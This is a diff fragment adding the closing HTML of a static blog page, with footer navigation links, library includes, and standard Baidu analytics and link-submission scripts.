+          <li><a href="https://github.com/c0ny1/">项目</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/gossip">闲言碎语</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+			  var hm = document.createElement("script");
+			  hm.src = "https://hm.baidu.com/hm.js?a50c39f542eebaf72e68c9ff51a854bc";
+			  var s = document.getElementsByTagName("script")[0]; 
+			  s.parentNode.insertBefore(hm, s);
+		})();
+	</script>
+
+
+
+	<script>
+		(function(){
+			var bp = document.createElement('script');
+			var curProtocol = window.location.protocol.split(':')[0];
+			if (curProtocol === 'https') {
+				bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+			}
+			else {
+				bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+			}
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(bp, s);
+		})();
+	</script>
+
+
+
+
+
+
+	<script src="/lib/fancybox/jquery.fancybox.min.js"></script>
+	<script src="/js/fancybox.js"></script>
+	<link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
